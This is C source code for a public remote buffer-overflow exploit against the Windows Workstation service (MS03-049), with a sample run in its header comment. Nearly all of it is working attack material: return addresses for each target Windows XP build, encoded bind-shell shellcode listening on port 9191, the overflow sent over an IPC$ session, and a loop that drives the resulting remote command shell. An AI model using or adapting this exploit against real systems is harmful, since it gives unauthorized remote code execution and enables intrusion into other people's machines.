/* To build new netapi32.lib
		pedump /exp netapi32.dll > netapi32.exp
		buildlib netapi32.exe netapi32.exp netapi32.lib netapi32.dll


d:\>rpc_wks_bo.exe

WKS service remote exploit MS03-049 by fiNis (fiNis[at]bk[dot]ru), ver:0.1.1
-------------------------------------------------------------------
Usage: rpc_wks_bo.exe [-ht]
	-h <IP>    : Target IP
	-t <Type>  : Target type (-t0 for a list)

d:\>rpc_wks_bo.exe -t0

Possible targets are:
============================
1) Window XP Pro + SP0 [Rus]
2) Window XP Pro + SP1 [Rus]
3) Crash all

d:\>rpc_wks_bo.exe -h 192.168.100.7 -t1

[+] Prepare exploit string
[+] Sleep at 2s ...
[+] Setting up IPC$ session...
[+] IPC$ session setup successfully!
[+] Sending exploit ...
[+] Initialize WSAStartup - OK
[+] Socket initialized - OK
[+] Try connecting to 192.168.100.7:9191 ...
[*] Connected to shell at 192.168.100.7:9191

Microsoft Windows XP [������ 5.1.2600]
(�) ���������� ����������, 1985-2001.

C:\WINDOWS\system32>

*/
/**************** Public version *****************/
#include <stdio.h>
#include <io.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <process.h>

#pragma lib <ws2_32.lib>
#pragma lib <netapi32.lib>
#pragma lib <mpr.lib>

#define RECVTIMEOUT		1
#define VER				"0.1.4"

extern char getopt(int,char **,char*);
extern char *optarg;


// ------------------------------------------------
void NetAddAlternateComputerName(wchar_t *Server, wchar_t *AlternateName, wchar_t * DomainAccount,
				wchar_t *DomainAccountPassword, unsigned int Reserved);
void send_exp();
// ----------Lamers buff =) ----------------------------
	char expl[3000];
	wchar_t expl_uni[6000];
	char tgt_net[30];
	wchar_t tgt_net_uni[60];
	char ipc[30];
// -----------------------------------------------------
struct {
	char *os;
	long jmpesp;
}
targets[] = {
	{ "Window XP + SP0 [Rus]            ", 0x77f5801c }, // 0x77d6754a(user32.dll)
	{ "Window XP + SP0 + Rollup [Rus]   ", 0x77f98db7 },  //0x77d639ab-work 0x77fb59cc - sp1
	{ "Window XP + SP1 [Rus]            ", 0x77fb59cc },
	{ "Window XP + SP1 + Rollup [Rus]   ", 0x77f9980f },  // 0x77d637db(user32.dll)
	{ "Crash all                ", 0x41424344 }
}, tgt_type;

unsigned char shellcode[] = // bind shell at 9191 port (484 bytes) // ripped =)
	"\xEB\x03\x5D\xEB\x05\xE8\xF8\xFF\xFF\xFF\x8B\xC5\x83\xC0\x11\x33"
	"\xC9\x66\xB9\xC9\x01\x80\x30\x88\x40\xE2\xFA\xDD\x03\x64\x03\x7C"
	"\x09\x64\x08\x88\x88\x88\x60\xC4\x89\x88\x88\x01\xCE\x74\x77\xFE"
	"\x74\xE0\x06\xC6\x86\x64\x60\xD9\x89\x88\x88\x01\xCE\x4E\xE0\xBB"
	"\xBA\x88\x88\xE0\xFF\xFB\xBA\xD7\xDC\x77\xDE\x4E\x01\xCE\x70\x77"
	"\xFE\x74\xE0\x25\x51\x8D\x46\x60\xB8\x89\x88\x88\x01\xCE\x5A\x77"
	"\xFE\x74\xE0\xFA\x76\x3B\x9E\x60\xA8\x89\x88\x88\x01\xCE\x46\x77"
	"\xFE\x74\xE0\x67\x46\x68\xE8\x60\x98\x89\x88\x88\x01\xCE\x42\x77"
	"\xFE\x70\xE0\x43\x65\x74\xB3\x60\x88\x89\x88\x88\x01\xCE\x7C\x77"
	"\xFE\x70\xE0\x51\x81\x7D\x25\x60\x78\x88\x88\x88\x01\xCE\x78\x77"
	"\xFE\x70\xE0\x2C\x92\xF8\x4F\x60\x68\x88\x88\x88\x01\xCE\x64\x77"
	"\xFE\x70\xE0\x2C\x25\xA6\x61\x60\x58\x88\x88\x88\x01\xCE\x60\x77"
	"\xFE\x70\xE0\x6D\xC1\x0E\xC1\x60\x48\x88\x88\x88\x01\xCE\x6A\x77"
	"\xFE\x70\xE0\x6F\xF1\x4E\xF1\x60\x38\x88\x88\x88\x01\xCE\x5E\xBB"
	"\x77\x09\x64\x7C\x89\x88\x88\xDC\xE0\x89\x89\x88\x88\x77\xDE\x7C"
	"\xD8\xD8\xD8\xD8\xC8\xD8\xC8\xD8\x77\xDE\x78\x03\x50\xDF\xDF\xE0"
	"\x8A\x88\xAB\x6F\x03\x44\xE2\x9E\xD9\xDB\x77\xDE\x64\xDF\xDB\x77"
	"\xDE\x60\xBB\x77\xDF\xD9\xDB\x77\xDE\x6A\x03\x58\x01\xCE\x36\xE0"
	"\xEB\xE5\xEC\x88\x01\xEE\x4A\x0B\x4C\x24\x05\xB4\xAC\xBB\x48\xBB"
	"\x41\x08\x49\x9D\x23\x6A\x75\x4E\xCC\xAC\x98\xCC\x76\xCC\xAC\xB5"
	"\x01\xDC\xAC\xC0\x01\xDC\xAC\xC4\x01\xDC\xAC\xD8\x05\xCC\xAC\x98"
	"\xDC\xD8\xD9\xD9\xD9\xC9\xD9\xC1\xD9\xD9\x77\xFE\x4A\xD9\x77\xDE"
	"\x46\x03\x44\xE2\x77\x77\xB9\x77\xDE\x5A\x03\x40\x77\xFE\x36\x77"
	"\xDE\x5E\x63\x16\x77\xDE\x9C\xDE\xEC\x29\xB8\x88\x88\x88\x03\xC8"
	"\x84\x03\xF8\x94\x25\x03\xC8\x80\xD6\x4A\x8C\x88\xDB\xDD\xDE\xDF"
	"\x03\xE4\xAC\x90\x03\xCD\xB4\x03\xDC\x8D\xF0\x8B\x5D\x03\xC2\x90"
	"\x03\xD2\xA8\x8B\x55\x6B\xBA\xC1\x03\xBC\x03\x8B\x7D\xBB\x77\x74"
	"\xBB\x48\x24\xB2\x4C\xFC\x8F\x49\x47\x85\x8B\x70\x63\x7A\xB3\xF4"
	"\xAC\x9C\xFD\x69\x03\xD2\xAC\x8B\x55\xEE\x03\x84\xC3\x03\xD2\x94"
	"\x8B\x55\x03\x8C\x03\x8B\x4D\x63\x8A\xBB\x48\x03\x5D\xD7\xD6\xD5"
	"\xD3\x4A\x8C\x88";


/***************************************************************/
void banner() {
	printf("\nWKS service remote exploit by fiNis (fiNis[at]bk[dot]ru), ver:%s\n",VER);
	printf(  "downloaded on www.K-OTIK.com\n");
	printf(  "-------------------------------------------------------------------\n");
}

void showtargets() {
	int i;
	printf("Possible targets are:\n");
	printf("============================\n");
	for (i=0;i<sizeof(targets)/sizeof(tgt_type);i++) {
		printf("%d) %s\n",i+1,targets[i].os);
	}
	exit(1);
}

void usage(char *prog) {
	banner();
	printf("Usage: %s [-ht]\n", prog);
	printf("\t-h <IP>    : Target IP\n");
	printf("\t-t <Type>  : Target type (-t0 for a list)\n");
	exit(1);
}

/***************************************************************/
long gimmeip(char *hostname)
{
	struct hostent *he;
	long ipaddr;

	if ((ipaddr = inet_addr(hostname)) < 0)
	{
		if ((he = gethostbyname(hostname)) == NULL)
		{
			printf("[x] Failed to resolve host: %s! Exiting...\n\n",hostname);
			WSACleanup();
			exit(1);
		}
		memcpy(&ipaddr, he->h_addr, he->h_length);
	}
	return ipaddr;
}

// ************************************* CMD *****************************
/*
 * Ripped from TESO code and modifed by ey4s for win32
 */

void cmdshell2(int sock) {
	int l;
	char buf[1000];
	struct timeval time;
	unsigned long ul[2];

	time.tv_sec=RECVTIMEOUT;
	time.tv_usec=0;

	while (1) {
		ul[0]=1;
		ul[1]=sock;

		l=select(0,(fd_set *)&ul,NULL,NULL,&time);
		if(l==1) {
			l=recv(sock,buf,sizeof(buf),0);
			if (l<=0) {
				printf("[x] Connection closed.\n");
				return;
			}
			l=write(1,buf,l);
			if (l<=0) {
				printf("[x] Connection closed.\n");
				return;
			}
		}
		else {
			l=read(0,buf,sizeof(buf));
			if (l<=0) {
				printf("[x] Connection closed.\n");
				return;
			}
			l=send(sock,buf,l,0);
			if (l<=0) {
				printf("[x] Connection closed.\n");
				return;
			}
		}
	}
}

/****************************************************************/
void send_exp() {
	NETRESOURCE _IPC_;

	_IPC_.lpLocalName = NULL;
	_IPC_.lpProvider = NULL;
	_IPC_.dwType = RESOURCETYPE_ANY;
	_IPC_.lpRemoteName = (char*)&ipc;
	printf("[+] Setting up IPC$ session...\n");
	if (WNetAddConnection2(&_IPC_,"","",0)!=ERROR_SUCCESS) {
		printf("[x] Couldn't establish IPC$ connection.\n");
		exit (1);
	}
	printf("[*] IPC$ session setup successfully!\n");
	printf("[+] Sending exploit ...\n");

	NetAddAlternateComputerName(tgt_net_uni, expl_uni ,NULL,NULL,0);
	// ka-a-a b0-0-0-ms //
}

// ***************************************************************
int main(int argc,char *argv[])
{
	WSADATA wsdata;
	int sock;
	unsigned short port = 9191;
	struct sockaddr_in target;
	unsigned long ip;
	char opt;
	int tgt_type = 0;
	char *tgt_host;

	if (argc<2) { usage(argv[0]); }

	while((opt = getopt(argc,argv,"h:t:v"))!=EOF) {
		switch(opt)
		{
			case 'h':
				tgt_host = optarg;
				snprintf(tgt_net,127, "\\\\%s", optarg);
				snprintf(ipc,127, "\\\\%s\\ipc$", optarg);
				break;
			case 't':
				tgt_type = atoi(optarg);
				if (tgt_type == 0 || tgt_type > sizeof(targets) / 8) {
					showtargets();
				}
				break;
			default:
				usage(argv[0]);
				break;
		}
	}

	printf("\n[+] Prepare exploit string\n");

	memset(expl, 0x00, sizeof(expl));
	memset(expl, 0x41, 2064);
	memcpy(&expl[2044], (unsigned char *) &targets[tgt_type-1].jmpesp, 4);
	//memcpy(&expl[2044], "BBBB", 4);
	memcpy(&expl[2064], shellcode, sizeof(shellcode));		// begin shellcode here

	memset(expl_uni, 0x00, sizeof(expl_uni));
	memset(tgt_net_uni, 0x00, sizeof(tgt_net_uni));
	mbstowcs(tgt_net_uni, tgt_net, sizeof(tgt_net));

	switch(tgt_type) {
		case 1:
		case 3:
	MultiByteToWideChar(CP_ACP, 0, expl, sizeof(expl), (unsigned short *)expl_uni,sizeof(expl_uni));
	// MultiByteToWideChar - 100 % work at XP+SP0+Rollup
	break;
		case 2:
			mbstowcs(expl_uni, expl, sizeof(expl)); // work at XP+SP1
			break;
		default:
			mbstowcs(expl_uni, expl, sizeof(expl));
			break;
	}

	beginthread(send_exp,0,NULL);

	printf("[+] Sleep at 2s ... \n");
	sleep(2000);

	if (WSAStartup(MAKEWORD(2,0),&wsdata)!=0) {
		printf("[x] WSAStartup error...\n");
		WSACleanup();
        return 1;
	}
	printf("[+] Initialize WSAStartup - OK\n");

	if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0) {

		printf("[x] Socket not initialized! Exiting...\n");
		WSACleanup();
        return 1;
	}
	printf("[*] Socket initialized - OK\n");

	ip=gimmeip(tgt_host);
	memset(&target, 0, sizeof(target));
	target.sin_family=AF_INET;
	target.sin_addr.s_addr = ip;
	target.sin_port=htons(port);

	printf("[+] Try connecting to %s:%d ...\n",tgt_host,port);

	if(connect(sock,(struct sockaddr *)&target, sizeof(target))!=0) {
			printf("\n[x] Exploit failed or is Filtred. Exiting...\n");
			WSACleanup();
			exit(1);
	}

	printf("[*] Connected to shell at %s:%d\n\n",inet_ntoa(target.sin_addr),port);
	cmdshell2(sock);
	closesocket(sock);
	WSACleanup();
	return 0;
}
